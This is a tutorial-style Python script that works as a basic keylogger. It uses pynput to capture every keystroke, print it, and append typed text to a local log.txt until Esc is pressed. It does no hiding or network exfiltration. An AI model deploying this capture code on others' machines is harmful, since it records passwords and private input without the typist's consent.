import pynput
from pynput.keyboard import Key, Listener


# Below Is  Variable And A List To Store Values
charCount = 0
keys = []

# Below function is to Perform Action When A Key Is Pressed


def onKeyPress(key):
    try:
        print('Key Pressed : ',key)    # Print pressed key
    except Exception as ex:
        print('There was an error : ', ex)

# Below Function Is To Handle key Release

def onKeyRelease(key):
    global keys, charCount  # Access global variables
    if key == Key.esc:
        return False
    else:
        if key == Key.enter:    # Write keys to file
            writeToFile(keys)
            charCount = 0
            keys = []
        elif key == Key.space:  # Write keys to file
            key = ' '
            writeToFile(keys)
            keys = []
            charCount = 0
        keys.append(key)    # Store the Keys
        charCount += 1      # Count keys pressed

# Below Function Writes Keys Pressed INto A Logged File

def writeToFile(keys):
    with open('log.txt','a') as file:
        for key in keys:
            key = str(key).replace("'","")   # Replace ' with space
            if 'key'.upper() not in key.upper():
                file.write(key)
        file.write("\n")    # Insert new line

# Now We Use The Listener Provided By pynput To Log The Keys Pressed Into a Logged File

with Listener(on_press=onKeyPress, on_release=onKeyRelease) as listener:
    listener.join()
